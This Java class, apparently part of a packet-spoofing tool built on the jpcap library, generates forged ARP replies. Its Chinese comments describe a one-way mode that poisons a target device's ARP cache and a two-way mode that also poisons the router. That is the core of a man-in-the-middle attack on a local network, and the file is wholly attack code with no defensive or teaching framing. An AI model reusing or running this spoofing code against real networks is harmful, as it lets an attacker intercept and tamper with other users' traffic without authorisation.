package Factory;

import java.util.HashSet;
import java.util.Set;

import jpcap.packet.ARPPacket;
import Util.SetPacket.SetARP;

public class ARPFactory {

	private int mode;
	private String hostIP;
	private String routeIP;
	private String yourMAC;
	private String deviceMAC;
	private String routeMAC;
	
	public static SetARP sa = new SetARP();
	
	public ARPFactory(String hostIP,String routeIP,String yourMAC,String deviceMAC,String routeMAC) {
		//模式2 产生两种ARP 欺骗路由把自己当作设备  和  欺骗设备把自己当作服务器
		this.mode = 2;
		
		this.hostIP = hostIP;
		this.routeIP = routeIP;
		this.yourMAC = yourMAC;
		this.deviceMAC = deviceMAC;
		this.routeMAC = routeMAC;
	}
	

	public ARPFactory(String hostIP,String routeIP,String yourMAC,String deviceMAC) {
		//模式1 产生一种ARP 欺骗设备把自己当作服务器
		this.mode = 1;
		this.hostIP = hostIP;
		this.routeIP = routeIP;
		this.yourMAC = yourMAC;
		this.deviceMAC = deviceMAC;
	}
	
	
	public Set<ARPPacket> getInstance(){
		
		Set<ARPPacket> ARPs = new HashSet<ARPPacket>();
		if(mode == 1){	 
			ARPPacket arp1 =  sa.fakeARP(hostIP,routeIP,deviceMAC,yourMAC);	
			ARPs.add(arp1);
		}
		if(mode == 2){
			
			ARPPacket arp1 =  sa.fakeARP(hostIP,routeIP,deviceMAC,yourMAC);
			ARPPacket arp2 =  sa.fakeARP(routeIP,hostIP,routeMAC,yourMAC);
			ARPs.add(arp1);
			ARPs.add(arp2);
		}
		
		return ARPs;
	}
	
}
